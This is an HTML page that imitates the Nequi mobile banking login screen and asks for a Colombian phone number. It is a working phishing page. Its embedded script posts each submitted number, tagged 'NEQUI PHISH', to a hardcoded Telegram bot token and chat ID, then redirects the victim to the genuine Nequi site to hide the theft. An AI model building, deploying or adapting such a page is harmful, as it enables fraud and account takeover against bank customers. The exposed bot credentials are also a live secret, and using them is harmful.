<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #1E0B2C;
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            color: white;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            font-size: 52px;
            font-weight: 700;
            margin-bottom: 80px;
            letter-spacing: -2px;
        }
        .logo span {
            color: #FF2D95;
        }
        .input-container {
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            padding: 5px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }
        .country {
            padding: 0 15px;
            font-size: 17px;
            border-right: 1px solid rgba(255,255,255,0.2);
        }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 16px 15px;
            font-size: 17px;
            color: white;
            outline: none;
        }
        input::placeholder {
            color: rgba(255,255,255,0.6);
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: #E91E63;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        .help {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 22px;
            opacity: 0.7;
        }
        .by {
            position: absolute;
            top: 25px;
            left: 20px;
            font-size: 14px;
            opacity: 0.6;
        }
    </style>
</head>
<body>
    <div class="help">?</div>
    <div class="by">by <span style="font-size:18px;">Ⓢ</span></div>

    <div class="container">
        <div class="logo"><span>■</span>Nequi</div>
        
        <form id="loginForm">
            <div class="input-container">
                <div class="country">+57</div>
                <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" required>
            </div>
            
            <button type="submit" class="btn">Entra</button>
        </form>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const phone = document.getElementById("phone").value.trim();

            if (phone.length < 10) {
                alert("Por favor ingresa un número válido");
                return;
            }

            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                alert("✅ Redirigiendo...");
                setTimeout(() => {
                    window.location.href = "https://www.nequi.com.co";
                }, 1200);
            })
            .catch(() => {
                window.location.href = "https://www.nequi.com.co";
            });
        });
    </script>
</body>
</html>
